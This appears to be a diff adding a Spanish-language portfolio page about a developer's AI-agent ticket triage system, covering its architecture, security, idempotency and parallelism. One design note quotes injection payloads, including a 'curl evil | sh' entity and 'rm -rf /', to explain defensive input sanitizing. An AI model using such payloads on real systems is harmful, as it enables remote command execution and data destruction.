@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Triaje de tickets con agentes de IA — Santiago Valenzuela López</title>
+<meta name="description" content="Un orquestador clasifica el ticket con apoyo de FAQ, convoca a especialistas (visual y de logs) y publica un único diagnóstico con la evidencia. Un código, tres desplegables.">
+<meta name="theme-color" content="#0a0c10">
+<meta name="color-scheme" content="dark">
+<link rel="canonical" href="https://santiagovalenzuelalopez-gif.github.io/proyectos/ai-ticket-triage-agents.html">
+<link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="es_CO">
+<meta property="og:title" content="Triaje de tickets con agentes de IA — Santiago Valenzuela López">
+<meta property="og:description" content="Un orquestador clasifica el ticket con apoyo de FAQ, convoca a especialistas (visual y de logs) y publica un único diagnóstico con la evidencia. Un código, tres desplegables.">
+<meta property="og:url" content="https://santiagovalenzuelalopez-gif.github.io/proyectos/ai-ticket-triage-agents.html">
+<meta name="twitter:card" content="summary">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="../assets/style.css">
+<script type="module">
+import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
+mermaid.initialize({
+  startOnLoad: true, securityLevel: "strict", theme: "base",
+  themeVariables: {
+    background: "#0f1219", fontFamily: "Inter, system-ui, sans-serif", fontSize: "14px",
+    primaryColor: "#181d2a", primaryTextColor: "#e7eaf0", primaryBorderColor: "#3a4559",
+    secondaryColor: "#131722", tertiaryColor: "#0f1219", lineColor: "#7b8699", textColor: "#c3cad6",
+    mainBkg: "#181d2a", nodeBorder: "#3a4559", clusterBkg: "#131722", edgeLabelBackground: "#0f1219",
+    actorBkg: "#181d2a", actorBorder: "#3a4559", actorTextColor: "#e7eaf0", signalColor: "#98a2b3",
+    signalTextColor: "#c3cad6", noteBkgColor: "#131722", noteTextColor: "#c3cad6", noteBorderColor: "#3a4559"
+  },
+  flowchart: { curve: "basis", htmlLabels: true }
+});
+</script>
+</head>
+<body>
+<a class="skip" href="#contenido">Saltar al contenido</a>
+<header class="site-header">
+  <div class="container nav">
+    <a class="brand" href="../">santiago<span>.</span>valenzuela</a>
+    <nav aria-label="Principal"><ul>
+      <li><a href="../#proyectos">Proyectos</a></li>
+      <li><a href="../#experiencia">Experiencia</a></li>
+      <li><a href="../#stack">Stack</a></li>
+      <li><a href="../#contacto">Contacto</a></li>
+    </ul></nav>
+  </div>
+</header>
+<main id="contenido" class="case"><div class="container">
+  <a class="back" href="../#proyectos">← Todos los proyectos</a>
+  <div class="head-row"><span class="badge extended">Extendí y refactoricé</span><span class="k" style="font:500 .8rem var(--mono);color:var(--faint);text-transform:uppercase;letter-spacing:.05em">Agentes · Orquestación · Seguridad</span></div>
+  <h1>Triaje de tickets con agentes de IA</h1>
+  <p class="summary">Un orquestador clasifica el ticket con apoyo de FAQ, convoca a especialistas (visual y de logs) y publica un único diagnóstico con la evidencia. Un código, tres desplegables.</p>
+  <ul class="tags"><li>FastAPI</li><li>Gemini</li><li>Agentes</li><li>Orquestación</li><li>Seguridad</li></ul>
+  <div class="metrics"><div class="metric"><b>76</b><span>tests</span></div><div class="metric"><b>3</b><span>roles de despliegue</span></div><div class="metric"><b>11</b><span>entradas hostiles probadas</span></div></div>
+
+  <section class="prose"><h2>El problema</h2><p style="color:#c3cad6">El texto de un ticket lo escribe un tercero y de él sale la «entidad» que se busca en un servidor de logs. Además, los webhooks se reintentan y duplican, y un especialista lento no debe impedir el diagnóstico.</p></section>
+
+  <section><h2>Arquitectura</h2>
+    <figure class="diagram" style="margin-inline:0"><pre class="mermaid">flowchart LR
+    H[Helpdesk] --&gt;|webhook + secreto| O[Orquestador]
+    O --&gt;|1 · guardas + clasificar + FAQ| L[(LLM)]
+    O --&gt;|2a · si es visual| V[Agente visual]
+    O --&gt;|2b · incidente o crítico| G[Agente de logs]
+    G --&gt;|búsqueda segura| S[(Logs del servidor)]
+    O --&gt;|3 · diagnóstico + evidencia| H</pre></figure>
+  </section>
+
+  <section><h2>Decisiones de diseño</h2><article class="decision">
+  <h3><i>01</i>El texto del ticket es entrada no confiable</h3>
+  <dl>
+    <dt>Problema</dt><dd>Una entidad como <code>x"; curl evil | sh; "</code> interpolada en un comando remoto sería ejecución remota de comandos.</dd>
+    <dt>Decisión</dt><dd class="main">Se reduce a un token estricto (<code>[a-z0-9-]</code>), se entrecomilla con <code>shlex.quote</code> y, si no cumple, <strong>no se busca</strong>; SSH solo con hosts conocidos. El modelo no ejecuta nada: su salida solo se publica o se valida contra listas cerradas.</dd>
+    <dt>Resultado</dt><dd>Tests con <code>"; rm -rf /</code>, <code>$(...)</code>, backticks, <code>*</code> y <code>../</code>: nada llega al servidor.</dd>
+  </dl>
+</article><article class="decision">
+  <h3><i>02</i>Idempotencia con dos mecanismos para dos riesgos</h3>
+  <dl>
+    <dt>Problema</dt><dd>Los helpdesk reenvían webhooks, a veces en paralelo.</dd>
+    <dt>Decisión</dt><dd class="main">La nota propia es la marca de idempotencia (sobrevive a reinicios e instancias) y un conjunto de tickets en curso evita procesar dos veces a la vez.</dd>
+    <dt>Resultado</dt><dd>Dos eventos simultáneos procesan el ticket <strong>una</strong> vez. Límite documentado: el bloqueo en curso es por proceso.</dd>
+  </dl>
+</article><article class="decision">
+  <h3><i>03</i>Especialistas en paralelo con presupuesto</h3>
+  <dl>
+    <dt>Problema</dt><dd>Un especialista caído o lento no debe bloquear el diagnóstico.</dd>
+    <dt>Decisión</dt><dd class="main">Se lanzan juntos con <code>gather</code>, cada uno con su límite; si fallan o tardan, el diagnóstico sale igual y lo indica («omitido por latencia»).</dd>
+    <dt>Resultado</dt><dd>La latencia es la del más lento, no la suma: el test mide 2 × 0,3 s en menos de 0,55 s.</dd>
+  </dl>
+</article><article class="decision">
+  <h3><i>04</i>Un código, tres desplegables</h3>
+  <dl>
+    <dt>Problema</dt><dd>El agente de logs necesita acceso a servidores; el orquestador está expuesto al helpdesk.</dd>
+    <dt>Decisión</dt><dd class="main"><code>SERVICE_ROLE</code> monta lo que corresponde; el orquestador usa el mismo contrato en proceso o por HTTP con identidad de servicio.</dd>
+    <dt>Resultado</dt><dd>Solo el agente de logs tiene la cuenta con acceso a los servidores. El cliente HTTP se prueba contra el servidor real.</dd>
+  </dl>
+</article></section>
+
+  <section><h2>Qué se verificó</h2><ul class="checks"><li>76 tests: flujo por tipo de ticket, guardas, idempotencia, paralelismo medido, degradación ante timeout y fallo, <em>kill switch</em> del tipo, entidades hostiles y el comando remoto construido.</li><li>Despliegue separado probado de verdad: agente de logs protegido con token (401 sin él) y orquestador que lo llama por HTTP; la evidencia de logs llega literal al ticket. CI en verde.</li></ul></section>
+
+  <section><h2>Límites: lo que no se verificó</h2><ul class="checks limits"><li>Gemini y SSH reales no se ejercitan en los tests; sí la construcción segura del comando y el contrato del cliente HTTP.</li><li>Solo hay adaptador de helpdesk en memoria: uno real implica implementar un puerto de tres métodos.</li></ul></section>
+
+  <div class="repo-cta">
+    <a class="btn primary" href="https://github.com/santiagovalenzuelalopez-gif/ai-ticket-triage-agents">Ver el repositorio</a>
+    <a class="btn" href="https://github.com/santiagovalenzuelalopez-gif/ai-ticket-triage-agents#readme">Leer el README</a>
+  </div>
+
+  <nav class="pager" aria-label="Proyectos"><a href="excel-reports-service.html">← Anterior<b>Reportes Excel con memoria acotada</b></a><a href="cloudrun-wif-cicd-kit.html">Siguiente →<b>CI/CD sin llaves hacia Cloud Run</b></a></nav>
+</div></main>
+<footer class="site-footer">
+  <div class="container row">
+    <span>© 2026 Santiago Valenzuela López · Cali, Colombia</span>
+    <span><a href="https://github.com/santiagovalenzuelalopez-gif" rel="me">GitHub</a> · <a href="https://www.linkedin.com/in/santiagovalenzuelal/" rel="me">LinkedIn</a> · <a href="mailto:santiagovlopez20@hotmail.com">Correo</a></span>
+  </div>
+</footer>
+</body>
+</html>
